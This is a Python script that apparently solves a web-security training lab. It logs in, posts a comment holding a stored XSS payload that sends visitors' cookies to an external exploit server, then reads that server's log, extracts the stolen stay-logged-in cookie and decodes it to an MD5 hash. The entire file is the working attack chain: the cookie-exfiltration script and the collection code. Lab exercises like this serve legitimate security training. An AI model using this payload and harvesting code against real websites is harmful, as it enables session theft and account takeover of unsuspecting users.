import requests
import urllib3
import hashlib 
import base64
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxies = {"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

url = "https://0a02009c042bb65280b2037100290026.web-security-academy.net/"

wiener_session = requests.session()

data = {"username":"wiener","password":"peter","stay-logged-in":"on"}

response = wiener_session.post(url + "login",verify=False,proxies=proxies,data=data)
print("winer session is ",wiener_session.cookies.get_dict())

# XSS vulnerability in the comment

xss_data = {
    "postId": "9",
    "comment": '<script>document.location="https://exploit-0a3400c40405b6cc804c021c012000bb.exploit-server.net/"+document.cookie</script>',
    "name": "test",
    "email": "jester@gmail.com",
    "website": ""
}

response1 = wiener_session.post(url+"/post/comment",verify=False,proxies=proxies,data=xss_data)

exploit_server = requests.get("https://exploit-0a3400c40405b6cc804c021c012000bb.exploit-server.net/log",verify=False)
match = re.search(r"stay-logged-in=([A-Za-z0-9+/=]+)", exploit_server.text)   # fetch the token from the response
if match:
        leaked_cookie = match.group(1)
        print(f"[+] Leaked stay-logged-in cookie: {leaked_cookie}")
        base64_decode = base64.b64decode(leaked_cookie).decode()             # decode the base64 token to get the md5 
        print(base64_decode)
        



